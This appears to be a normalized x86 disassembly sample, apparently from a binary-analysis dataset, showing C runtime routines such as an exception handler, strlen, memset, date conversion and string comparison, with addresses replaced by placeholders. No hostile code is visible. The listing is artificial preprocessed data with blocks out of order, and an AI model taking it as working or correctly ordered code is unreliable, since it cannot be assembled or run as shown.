mov ebx [ esp + 0x20 ]
push ebp
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
cmp eax 0xfffffffe
mov [ esp + 0x13 ] 0x0
mov [ esp + 0x18 ] 0x1
lea edi [ ebx + 0x10 ]
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40f589
mov eax [ esp + 0x28 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40f589
cmp [ ebx + 0xc ] 0xfffffffe
je r-xdata
mov ebp [ ebx + 0xc ]
cmp ebp 0xfffffffe
mov ecx [ esp + 0x30 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
mov [ ebx - 0x4 ] edx
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push rw-data
push edi
mov ecx ebx
mov edx 0xfffffffe
call sub_41814c
jmp r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
test ecx ecx
lea ebx [ esi + eax * 4 + 0x10 ]
mov eax [ ebx ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xfffffffe
mov ebp eax
jne r-xdata
mov edx edi
call sub_418102
test eax eax
mov [ esp + 0x13 ] 0x1
jl r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40f589
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40f589
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov [ esp + 0x18 ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ esp + 0x28 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x2c ]
call sub_418132
mov eax [ esp + 0x2c ]
cmp [ eax + 0xc ] ebp
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebp
mov ecx eax
call sub_41814c
mov eax [ esp + 0x2c ]
push r--data
call sub_4181e2
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40f589
mov ecx [ ebx + 0x8 ]
mov edx edi
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40f589
mov edx [ esp + 0x28 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_41bf71
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_4108e0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_41096b
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_418250
add esp 0xc
call sub_411077
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
sub_4109d0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_41860c
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_410a4a
push ebp
mov ebp esp
sub esp 0x48
push ebx
xor ebx ebx
push edi
mov edi eax
cmp edi ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ edi + 0x14 ]
cdq
mov ecx eax
mov eax edx
mov [ ebp - 0x14 ] ecx
add ecx 0xffffffbb
mov [ ebp - 0x10 ] eax
adc eax 0xffffffff
cmp eax ebx
push esi
ja r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_411077
or edx 0xffffffff
mov [ eax ] 0x16
mov eax edx
jb r-xdata
pop edi
pop ebx
leave
retn
mov eax [ edi + 0x10 ]
cmp eax ebx
jl r-xdata
cmp ecx 0x408
ja r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov ecx edx
cdq
add [ ebp - 0x14 ] eax
mov [ edi + 0x10 ] ecx
adc [ ebp - 0x10 ] edx
cmp ecx ebx
jge r-xdata
cmp eax 0xb
jle r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add ecx 0xffffffbb
adc eax 0xffffffff
cmp eax ebx
ja r-xdata
add ecx 0xc
add [ ebp - 0x14 ] 0xffffffff
mov [ edi + 0x10 ] ecx
adc [ ebp - 0x10 ] 0xffffffff
mov esi [ edi + 0x10 ]
mov eax [ esi * 4 + rw-data ]
push ebx
push 0x4
push [ ebp - 0x10 ]
cdq
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
call sub_419120
or eax edx
mov ebx 0x190
jne r-xdata
jb r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
push 0x0
add eax 0x76c
push ebx
adc ecx 0x0
push ecx
push eax
call sub_419120
or eax edx
jne r-xdata
push 0x0
push 0x64
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_419120
or eax edx
jne r-xdata
cmp ecx 0x408
ja r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
push 0x0
pop ecx
sub esi 0x1
sbb eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push ecx
add eax 0x12b
push ebx
adc edx ecx
push edx
push eax
mov [ ebp - 0x24 ] esi
call sub_412b40
mov ebx eax
mov eax edx
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
cdq
push 0x0
push 0x64
push [ ebp - 0x20 ]
add ebx eax
mov eax [ ebp - 0xc ]
adc eax edx
push esi
mov [ ebp - 0xc ] eax
call sub_412b40
push 0x0
push 0x4
push [ ebp - 0x20 ]
sub ebx eax
mov eax [ ebp - 0xc ]
sbb eax edx
push esi
mov [ ebp - 0xc ] eax
call sub_412b40
push 0x0
push 0x16d
push [ ebp - 0x10 ]
add ebx eax
mov eax [ ebp - 0xc ]
push [ ebp - 0x14 ]
adc eax edx
mov [ ebp - 0xc ] eax
call sub_412b00
add ebx eax
mov eax [ ebp - 0xc ]
adc eax edx
add ebx [ ebp - 0x1c ]
push 0x0
adc eax [ ebp - 0x18 ]
pop esi
push esi
sub ebx 0x63df
push 0x18
sbb eax esi
push eax
push ebx
call sub_412b00
mov ecx eax
mov eax [ edi + 0x8 ]
mov ebx edx
cdq
push esi
add eax ecx
push 0x3c
adc edx ebx
push edx
push eax
call sub_412b00
mov ecx eax
mov eax [ edi + 0x4 ]
mov ebx edx
cdq
add eax ecx
adc edx ebx
push esi
push 0x3c
push edx
push eax
call sub_412b00
mov ecx eax
mov eax [ edi ]
mov ebx edx
cdq
add eax ecx
adc edx ebx
cmp [ ebp + 0x8 ] esi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
je r-xdata
cmp esi 0x1
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_4186af
call sub_419081
lea eax [ ebp - 0x8 ]
push eax
call sub_41891f
test eax eax
pop ecx
je r-xdata
add [ ebp - 0x1c ] 0x1
adc [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
push 0x9
pop ecx
lea esi [ ebp - 0x48 ]
[ edi ] [ esi ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_418953
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
pop esi
mov eax [ ebp - 0x4 ]
cdq
add [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
adc [ ebp - 0x10 ] edx
lea eax [ ebp - 0x48 ]
push eax
call sub_410d0a
test eax eax
pop ecx
pop ecx
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
mov eax [ edi + 0x20 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
cdq
add [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
adc [ ebp - 0x10 ] edx
lea eax [ ebp - 0x48 ]
push eax
call sub_410d0a
jmp r-xdata
jge r-xdata
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp - 0x28 ] esi
jle r-xdata
sub_410d0a
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
jne r-xdata
push ebx
push 0x24
push 0xff
push esi
call sub_4109d0
mov ebx [ ebp + 0xc ]
add esp 0xc
cmp ebx edi
je r-xdata
call sub_411077
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
call sub_411077
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_413fad
add esp 0x14
mov eax [ ebx + 0x4 ]
cmp eax edi
mov ecx [ ebx ]
jg r-xdata
pop edi
pop esi
leave
retn
pop ebx
cmp eax 0x7
jl r-xdata
jl r-xdata
call sub_419081
lea eax [ ebp - 0x8 ]
push eax
call sub_4188eb
test eax eax
pop ecx
je r-xdata
jg r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx edi
jae r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_41891f
test eax eax
pop ecx
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413eb1
add esp 0x14
cmp ecx 0x93406fff
jbe r-xdata
mov eax esi
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_418953
test eax eax
pop ecx
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413eb1
add esp 0x14
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx edi
mov ebx [ ebx ]
jl r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413eb1
add esp 0x14
push eax
push esi
call sub_4186af
cmp eax edi
pop ecx
pop ecx
jne r-xdata
jg r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
mov eax [ ebp - 0x4 ]
cdq
sub ebx eax
lea eax [ ebp - 0x14 ]
push eax
sbb ecx edx
push esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ecx
call sub_4186af
cmp eax edi
pop ecx
pop ecx
jne r-xdata
cmp ebx 0x3f480
jbe r-xdata
mov eax [ esi ]
cdq
mov ebx eax
mov eax [ ebp - 0x4 ]
mov ecx edx
cdq
sub ebx eax
sbb ecx edx
mov [ ebp - 0x10 ] ecx
mov edx ecx
push esi
call sub_4190d0
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
push edi
push 0x3c
push [ ebp - 0x10 ]
push ebx
call sub_412b40
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx edx
cdq
push edi
add ebx eax
adc ecx edx
push 0x3c
push ecx
push ebx
mov [ ebp - 0x10 ] ecx
call sub_419120
cmp eax edi
mov [ esi + 0x4 ] eax
jge r-xdata
add eax 0x3c
add ebx 0xffffffc4
adc [ ebp - 0x10 ] 0xffffffff
mov [ esi ] eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax ecx
cdq
mov ecx eax
mov eax edx
mov [ ebp + 0x8 ] eax
mov eax [ esi ]
cdq
mov ebx eax
sub ebx ecx
mov ecx [ ebp + 0x8 ]
sbb edx ecx
mov [ ebp - 0x10 ] edx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
xor eax eax
push esi
call sub_4190d0
test eax eax
pop ecx
je r-xdata
push edi
push 0x3c
push [ ebp - 0x10 ]
push ebx
call sub_412b40
mov ebx eax
mov eax [ esi + 0x8 ]
mov ecx edx
cdq
push edi
add ebx eax
adc ecx edx
push 0x18
push ecx
push ebx
mov [ ebp - 0x10 ] ecx
call sub_419120
cmp eax edi
mov [ esi + 0x8 ] eax
jge r-xdata
add eax 0x3c
add ebx 0xffffffc4
adc [ ebp - 0x10 ] 0xffffffff
mov [ esi + 0x4 ] eax
push edi
push 0x3c
push edx
push ebx
call sub_419120
cmp eax edi
mov [ esi ] eax
jge r-xdata
mov eax [ ebp - 0xc ]
cdq
sub [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
sbb [ ebp - 0x10 ] edx
push esi
call sub_4186af
cmp eax edi
pop ecx
pop ecx
jne r-xdata
push edi
push 0x18
push [ ebp - 0x10 ]
push ebx
call sub_412b40
cmp edx edi
mov ecx eax
jg r-xdata
add eax 0x18
add ebx 0xffffffe8
adc [ ebp - 0x10 ] 0xffffffff
mov [ esi + 0x8 ] eax
mov [ esi + 0x20 ] 0x1
jmp r-xdata
jl r-xdata
mov eax [ esi + 0x18 ]
lea eax [ eax + ecx + 0x7 ]
cdq
push 0x7
pop ebx
idiv ebx
add [ esi + 0xc ] ecx
mov eax [ esi + 0xc ]
cmp eax edi
mov [ esi + 0x18 ] edx
jg r-xdata
cmp ecx edi
jae r-xdata
add [ esi + 0x1c ] ecx
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] 0x16c
mov [ esi + 0x10 ] 0xb
jmp r-xdata
sub_410fb4
push sub_410740
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_41103c
mov eax [ esp + 0x4 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
retn
inc ecx
cmp ecx 0x2d
jl r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
retn
push 0xd
pop eax
retn
sub_4110bb
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_41576b
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_419af1
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_4193e0
mov [ esi + 0x4 ] eax
sub_41113d
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_419b80
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_41120a
mov eax [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_411077
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
sub_41127b
push ebx
mov ebx [ esp + 0x8 ]
push ebp
xor ebp ebp
cmp ebx ebp
jne r-xdata
push esi
push edi
push ebx
call sub_4108e0
mov esi eax
inc esi
push esi
call sub_40f80e
mov edi eax
cmp edi ebp
pop ecx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push ebx
push esi
push edi
call sub_410677
add esp 0xc
test eax eax
je r-xdata
pop ebp
pop ebx
retn
mov eax edi
jmp r-xdata
push ebp
push ebp
push ebp
push ebp
push ebp
call sub_413eb1
add esp 0x14
pop edi
pop esi
sub_4112cb
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_4128cb ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
